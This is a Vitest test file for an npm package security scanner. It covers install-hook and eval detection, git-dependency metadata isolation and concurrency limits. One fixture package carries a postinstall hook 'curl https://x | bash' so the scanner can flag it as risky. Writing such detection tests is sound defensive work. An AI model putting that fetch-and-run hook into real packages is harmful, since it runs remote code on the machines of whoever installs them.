import crypto from 'crypto';
import zlib from 'zlib';
import {describe, expect, it} from 'vitest';
import {JsonCache} from '../Cache/JsonCache.js';
import {FingerprintBuilder} from '../Fingerprint/FingerprintBuilder.js';
import {Registry} from '../Registry/Registry.js';
import {OsvClient} from '../Security/OsvClient.js';
import {ScriptSeverity} from '../Security/ScriptScanner.js';
import {SecurityScanner} from '../Security/SecurityScanner.js';

const BLOCK = 512;

function tarHeader(name: string, size: number): Buffer {
    const h = Buffer.alloc(BLOCK);
    h.write(name, 0, 100, 'utf8');
    h.write('0000644 ', 100, 8, 'ascii');
    h.write('0000000 ', 108, 8, 'ascii');
    h.write('0000000 ', 116, 8, 'ascii');
    h.write(size.toString(8).padStart(11, '0') + ' ', 124, 12, 'ascii');
    h.write('00000000000 ', 136, 12, 'ascii');
    h.write('        ', 148, 8, 'ascii');
    h.write('0', 156, 1, 'ascii');
    h.write('ustar', 257, 6, 'ascii');
    h.write('00', 263, 2, 'ascii');
    let sum = 0;
    for (let i = 0; i < BLOCK; i++) {
        sum += h[i];
    }
    h.write(sum.toString(8).padStart(6, '0') + '\0 ', 148, 8, 'ascii');
    return h;
}

function buildTgz(files: {name: string; content: string}[]): Buffer {
    const parts: Buffer[] = [];
    for (const f of files) {
        const body = Buffer.from(f.content, 'utf8');
        const padded = Buffer.alloc(Math.ceil(body.length / BLOCK) * BLOCK);
        body.copy(padded);
        parts.push(tarHeader(f.name, body.length));
        parts.push(padded);
    }
    parts.push(Buffer.alloc(BLOCK));
    return zlib.gzipSync(Buffer.concat(parts));
}

function tgzWithScripts(scripts: Record<string, string>): Buffer {
    return buildTgz([
        {
            name: 'package/package.json',
            content: JSON.stringify({name: 'x', version: '1.0.0', scripts})
        }
    ]);
}

describe('SecurityScanner.scanHeuristicsBatch', () => {
    it('classifies install hooks and detects code patterns across a batch', async () => {
        const tarballs: Record<string, Buffer> = {
            'clean@1.0.0': buildTgz([{name: 'package/package.json', content: '{}'}]),
            'risk@1.0.0': tgzWithScripts({postinstall: 'curl https://x | bash'}),
            'eval@1.0.0': buildTgz([
                {name: 'package/package.json', content: '{}'},
                {name: 'package/index.js', content: 'const x = eval("1+1");'}
            ])
        };

        const builder = new FingerprintBuilder(null, async (name, version) => {
            return tarballs[`${name}@${version}`] ?? null;
        });

        const osv = new OsvClient(null, async () => ({vulns: []}));
        const registry = new Registry('http://unused', new JsonCache('/tmp/nppm-noop-' + Math.random().toString(36).slice(2), 60));
        const scanner = new SecurityScanner(osv, builder, registry);

        const entries = await scanner.scanHeuristicsBatch([
            {name: 'clean', version: '1.0.0'},
            {name: 'risk', version: '1.0.0'},
            {name: 'eval', version: '1.0.0'}
        ]);

        expect(entries[0].scripts.maxSeverity).toBeNull();
        expect(entries[0].patterns.maxSeverity).toBeNull();

        expect(entries[1].scripts.maxSeverity).toBe(ScriptSeverity.risk);
        expect(entries[1].patterns.maxSeverity).toBeNull();

        expect(entries[2].patterns.count).toBeGreaterThan(0);
    });

    it('returns null severities when the fingerprint cannot be built', async () => {
        const builder = new FingerprintBuilder(null, async () => null);
        const osv = new OsvClient(null, async () => ({vulns: []}));
        const registry = new Registry('http://unused', new JsonCache('/tmp/nppm-noop-' + Math.random().toString(36).slice(2), 60));
        const scanner = new SecurityScanner(osv, builder, registry);

        const entries = await scanner.scanHeuristicsBatch([{name: 'missing', version: '0.0.1'}]);
        expect(entries[0].scripts.maxSeverity).toBeNull();
        expect(entries[0].patterns.maxSeverity).toBeNull();
    });

    it('skips cadence + freshness for git-installed versions', async () => {
        // The user's `figtree` is a git dep, but npm has an unrelated
        // 11-year-old `figtree` from another author. The matrix must
        // not flag the git install as STALE / NEW based on that
        // collision — both summaries should report `level: null`.
        const builder = new FingerprintBuilder(null, async () => null);
        const osv = new OsvClient(null, async () => ({vulns: []}));
        const cache = new JsonCache('/tmp/nppm-noop-' + Math.random().toString(36).slice(2), 60);
        await cache.set('reg_figtree', {
            data: {
                name: 'figtree',
                'dist-tags': {latest: '0.0.0'},
                versions: {},
                time: {created: '2015-01-03T13:21:21.270Z', '0.0.0': '2015-01-03T13:21:21.270Z'}
            }
        });
        const registry = new Registry('http://unused', cache);
        const scanner = new SecurityScanner(osv, builder, registry);

        const entries = await scanner.scanHeuristicsBatch([
            {name: 'figtree', version: 'github:user/figtree'}
        ]);

        expect(entries[0].cadence.level).toBeNull();
        expect(entries[0].cadence.daysSinceLastRelease).toBeNull();
        expect(entries[0].freshness.level).toBeNull();
        expect(entries[0].freshness.packageAgeDays).toBeNull();
    });

    it('does not borrow license, provenance or typosquat from an unrelated npm package for git deps', async () => {
        // The user's `figtree` lives only on GitHub; the npm registry
        // has an unrelated 11-year-old `figtree` from a different
        // author with `license: UNLICENSED`, a `dist` entry, and a
        // name that's Levenshtein-1 to a popular package. None of
        // those signals belong to the user's package — the report
        // must show neither the foreign license, nor a provenance
        // verdict, nor a typosquat finding.
        const builder = new FingerprintBuilder(null, async () => null);
        const osv = new OsvClient(null, async () => ({vulns: []}));
        const cache = new JsonCache('/tmp/nppm-noop-' + Math.random().toString(36).slice(2), 60);
        await cache.set('reg_figtree', {
            data: {
                name: 'figtree',
                license: 'UNLICENSED',
                'dist-tags': {latest: '0.0.0'},
                versions: {},
                dist: {
                    '0.0.0': {
                        tarball: 'https://registry.npmjs.org/figtree/-/figtree-0.0.0.tgz',
                        signatures: [{keyid: 'k', sig: 's'}]
                    }
                },
                time: {created: '2015-01-03T13:21:21.270Z', '0.0.0': '2015-01-03T13:21:21.270Z'}
            }
        });
        const registry = new Registry('http://unused', cache);
        const scanner = new SecurityScanner(osv, builder, registry);

        const entries = await scanner.scanHeuristicsBatch([
            {name: 'figtree', version: 'github:user/figtree'}
        ]);

        expect(entries[0].license.spdx).toBeNull();
        expect(entries[0].license.severity).toBe('unknown');
        expect(entries[0].provenance.level).toBeNull();
        expect(entries[0].typosquat.level).toBeNull();
        expect(entries[0].typosquat.closestMatch).toBeNull();
        expect(entries[0].typosquat.hasConfusables).toBe(false);
    });

    it('respects the concurrency bound (does not fire all in parallel)', async () => {
        let inflight = 0;
        let peak = 0;

        const builder = new FingerprintBuilder(null, async () => {
            inflight++;
            peak = Math.max(peak, inflight);
            await new Promise((r) => setTimeout(r, 5));
            inflight--;
            return buildTgz([{name: 'package/package.json', content: '{}'}]);
        });

        const osv = new OsvClient(null, async () => ({vulns: []}));
        const registry = new Registry('http://unused', new JsonCache('/tmp/nppm-noop-' + Math.random().toString(36).slice(2), 60));
        const scanner = new SecurityScanner(osv, builder, registry);

        const packages = Array.from({length: 20}, (_, i) => ({
            name: `pkg${i}`,
            version: '1.0.0'
        }));

        await scanner.scanHeuristicsBatch(packages, 4);
        expect(peak).toBeLessThanOrEqual(4);

        // crypto import is just to make the test file harder to dead-code
        // strip from a build pipeline; it's not used semantically.
        expect(typeof crypto.createHash).toBe('function');
    });
});